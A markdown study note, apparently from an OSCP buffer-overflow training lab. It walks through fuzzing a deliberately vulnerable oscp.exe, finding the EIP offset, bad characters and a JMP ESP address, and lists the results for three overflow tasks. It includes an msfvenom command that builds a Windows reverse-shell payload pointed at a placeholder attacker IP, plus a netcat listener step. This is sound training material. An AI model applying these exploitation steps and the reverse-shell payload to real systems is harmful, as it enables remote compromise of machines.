# Buffer Overflow Prep

### oscp.exe - OVERFLOW1

**Crash Replication and Controlling EIP**

Fuzz the server until it crashes then note the byte value. Use the metasploit tool 
pattern_create.rb to create a cyclic pattern 400 bytes longer than the value that crashed 
the server (2400).

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400`

Copy the output and place it in the payload variable in exploit.py.

Run oscp.exe in Immunity Debugger and run exploit.py then, when the server has crashed, run 
`!mona findmsp -distance 2400` to find the EIP offset.

Set the offset in exploit.py to the offset value here:
`EIP contains normal pattern : ... (offset XXXX)`

And set retn to BBBB in exploit.py

Run the exploit and the EIP should be overwritten with 4 B's (42424242)

badchars: `\x00\x07\x08\x2e\x2f\xa0\xa1`

[Fuzzing script](./fuzzing.py)
[Exploit script](./exploit.py)

**Finding bad chars**

Create a bytearray with mona `!mona bytearray -b "\x00"` 
*Note: -b is deprecated and was replaced by -cpb*

Use python to generate a string of bad chars identical to the bytearray

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Paste the generated badchars into the payload variable in exploit.py and run it.

Copy the ESP register in ImmunityDebugger and use it in the following mona command:
`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

A popup called mona memory comparison results should appear with the badchars

Update the bytearray with mona and the exploit payload, removing the badchars from the popup

Repeat the process until the popup returns a status of Unmodified, indicating no more 
badchars remain.

**Finding a Jump Point**

Run `!mona jmp -r esp -cpb <badchars>` to find all jmp esp instructions with addresses that 
don't contain any of the specified badchars

Copy one of the addresses and use it to set the retn variable in exploit.py.

The addresses are in little endian so need to be reversed.

**Generate Payload**

Use msfvenom to generate the payload 
`msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=4444 EXITFUNC=thread -b <BADCHARS> -f c`

Update the payload variable to use the shellcode using the following formatting:
```
payload = ("\xba\xbf\xef\xf4\xc3\xd9\xf6\xd9\x74\x24\xf4\x5e\x29\xc9"
...
"\x89")
```

**Prepend NOPs**

Since an encoder was likely used to generate the payload, you will need some space in memory 
for the payload to unpack itself. 

You can do this by setting the padding variable to a string of 16 or more "No Operation" 
(\x90) bytes 
`padding = "\x90" * 16`

**Exploit!**

Start netcat listener on the attacking machine and run exploit.py to gain a shell on the 
target.

### oscp.exe - OVERFLOW2

Fuzzing crashed the target at 700 bytes

EIP offset is 634

Found badchars: "\x00\x23\x3c\x83\xba"

Found jump point: 625011AF 

### oscp.exe - OVERFLOW3

Fuzzing crashed at 1300 bytes

EIP offset is 1274

Badchars are: "\x00\x11\x40\x5f\xb8\xee" 

Found jump point: 62501203